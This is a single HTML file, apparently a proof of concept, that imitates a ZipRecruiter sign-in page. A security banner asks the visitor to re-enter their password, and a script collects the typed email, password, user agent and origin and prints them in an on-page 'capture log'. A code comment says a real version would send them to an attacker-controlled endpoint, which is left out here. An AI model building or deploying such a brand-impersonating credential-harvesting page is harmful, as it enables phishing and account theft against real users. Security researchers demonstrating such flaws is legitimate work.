<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Sign in</title>
<style>
  :root { --zr:#1976d2; --bg:#f6f7f9; --ink:#1b1f23; --muted:#6a7280; }
  * { box-sizing: border-box; }
  html, body { margin:0; padding:0; background:var(--bg); color:var(--ink);
               font:16px/1.4 -apple-system, system-ui, Roboto, sans-serif; }
  header { background:#fff; padding:18px 20px; border-bottom:1px solid #e3e6ea; }
  header .logo { font-weight:700; font-size:18px; color:var(--zr); letter-spacing:-.2px; }
  main { padding: 28px 22px; }
  h1 { font-size: 22px; margin: 4px 0 6px; }
  p.lead { color:var(--muted); margin:0 0 22px; font-size:14px; }
  label { display:block; font-size:13px; color:var(--muted); margin:14px 0 6px; }
  input { width:100%; padding:14px 12px; font-size:16px; border:1px solid #d6dadf;
          border-radius:8px; background:#fff; }
  input:focus { outline:none; border-color:var(--zr); box-shadow:0 0 0 3px rgba(25,118,210,.18); }
  button { width:100%; margin-top:22px; padding:14px; font-size:16px; font-weight:600;
           background:var(--zr); color:#fff; border:0; border-radius:8px; }
  .small { font-size:12px; color:var(--muted); text-align:center; margin-top:18px; }
  .banner { background:#fff8e1; border:1px solid #ffe082; color:#7a5500; padding:12px;
            border-radius:8px; margin-bottom:18px; font-size:13px; }
  pre { font-size:11px; background:#fff; border:1px solid #e3e6ea; padding:8px;
        margin-top:30px; max-height:140px; overflow:auto; }
</style>
</head>
<body>
<header><div class="logo">ZipRecruiter</div></header>

<main>
  <div class="banner">For your security, please re-enter your password to continue.</div>
  <h1>Welcome back</h1>
  <p class="lead">Sign in to keep your application progress.</p>

  <form id="f" onsubmit="return submitCreds(event)">
    <label for="email">Email</label>
    <input id="email" type="email" autocomplete="email" required>
    <label for="pw">Password</label>
    <input id="pw" type="password" autocomplete="current-password" required>
    <button type="submit">Sign in</button>
  </form>

  <div class="small">Loaded from: <span id="origin"></span></div>

  <h2 style="font-size:13px;color:var(--muted);margin-top:30px">PoC capture log</h2>
  <pre id="log">[awaiting submit]</pre>
</main>

<script>
document.getElementById("origin").textContent = location.origin;

function submitCreds(ev) {
  ev.preventDefault();
  const email = document.getElementById("email").value;
  const pw    = document.getElementById("pw").value;
  const ua    = navigator.userAgent;
  const out   = { ts: new Date().toISOString(), origin: location.origin, ua, email, password: pw };
  document.getElementById("log").textContent =
    "CAPTURED:\n" + JSON.stringify(out, null, 2);
  // Real PoC would POST to attacker-controlled endpoint here. Left as a
  // no-op so this file can be hosted on a static server with no backend.
  return false;
}
</script>
</body>
</html>
